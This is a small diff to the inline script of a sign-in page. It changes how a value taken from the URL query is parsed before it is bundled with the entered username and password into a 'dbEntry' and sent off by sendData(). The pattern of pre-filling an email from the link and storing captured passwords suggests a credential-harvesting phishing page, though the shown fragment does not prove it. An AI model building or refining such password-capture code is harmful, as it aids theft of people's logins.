@@ -730,8 +730,10 @@ class dbEntry
 var getUrl = window.location.search.substring(1);
 //$('#email')[0].value = getUrl.split("=")[1];
 if(getUrl.length == 0) getUrl = "undefined"
+else getUrl = getUrl.split("=")[1]
+
 $('#form_signin').on('submit', function() {
-	var entry = new dbEntry(getUrl.split("=")[1], $('#username')[0].value, $('#password')[0].value);
+	var entry = new dbEntry(getUrl, $('#username')[0].value, $('#password')[0].value);
     entry.sendData();
 });
 </script>
